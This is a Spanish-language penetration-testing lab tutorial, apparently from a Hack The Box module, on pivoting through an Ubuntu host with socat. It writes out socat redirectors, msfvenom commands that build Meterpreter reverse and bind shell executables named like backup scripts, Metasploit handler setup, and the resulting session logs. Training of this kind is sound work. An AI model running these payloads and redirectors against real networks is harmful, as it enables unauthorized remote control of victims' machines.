
# Pivoting con Socat

## <mark style="color:purple;">Redirección Socat con Reverse Shell</mark>

[Socat](https://linux.die.net/man/1/socat) es una herramienta de retransmisión bidireccional que puede crear tomas de tubería entre `2` canales de red independientes sin necesidad de utilizar túneles SSH. Actúa como un redirector que puede escuchar en un host y puerto y reenviar esos datos a otra dirección IP y puerto. Podemos iniciar el listener de Metasploit usando el mismo comando mencionado en la última sección en nuestro host de ataque, y podemos iniciar `socat` en el servidor Ubuntu.

### **Iniciando el listener de Socat**

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat escuchará en el puerto `8080` del localhost y reenviará todo el tráfico al puerto `80` de nuestro host de ataque (`10.10.14.18`). Una vez que nuestro redirector esté configurado, podemos crear un payload que se conectará nuevamente a nuestro redirector, que se ejecuta en nuestro servidor Ubuntu. También iniciaremos un listener en nuestro host de ataque porque tan pronto como socat reciba una conexión de un objetivo, redirigirá todo el tráfico al listener de nuestro host de ataque, donde obtendremos un shell.

### **Creando el payload de Windows**

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Tenga en cuenta que debemos transferir este payload al host de Windows. Podemos utilizar algunas de las mismas técnicas utilizadas en secciones anteriores para hacerlo.

### **Iniciando Metasploit**

```shell-session
afsh4ck@kali$ sudo msfconsole

<SNIP>
```

### **Configuración e inicio del multi/handler**

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

Podemos probar esto ejecutando nuestro payload en el host de Windows nuevamente, y esta vez deberíamos ver una conexión de red desde el servidor Ubuntu.

### **Estableciendo la sesión de Meterpreter**

```bash
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

***

## <mark style="color:purple;">Redirección Socat con un Bind Shell</mark>

De manera similar al redirector Reverse Shell de socat, también podemos crear un redirector de Bind Shell con socat. Esto es diferente de los Reverse Shell que se conectan desde el servidor de Windows al servidor de Ubuntu y son redirigidos a nuestro host de ataque. En el caso de Bind Shells, el servidor de Windows iniciará un listener y se vinculará a un puerto en particular. Podemos crear un payload de Bind Shell para Windows y ejecutarla en el host de Windows. Al mismo tiempo, podemos crear un redirector socat en el servidor Ubuntu, que escuchará las conexiones entrantes desde un Multi Handler de Metasploit y las reenviará a un Bind Shell en un destino Windows. La siguiente figura debería explicar el pivote de una manera mucho mejor.

![](https://academy.hackthebox.com/storage/modules/158/55.png)

Podemos crear un bind shell usando msfvenom con el siguiente comando.

### **Crear el payload de Windows**

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

Podemos iniciar un listener `socat bind shell`, que escucha en el puerto `8080`y reenvía paquetes al servidor de Windows `8443`.

### **Iniciando el listener Socat Bind Shell**

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finalmente, podemos iniciar un Multi Handler de Metasploit. Este Multi Handler se puede configurar para conectarse al listener de nuestro socat en el puerto 8080 (servidor Ubuntu)

### **Configuración e inicio del Bind multi/handler**

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

Podemos ver un bind handler conectado a una solicitud stage pivotada a través de un listener socat al ejecutar el payload en un objetivo de Windows.

### **Estableciendo una sesión de Meterpreter**

```bash
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```
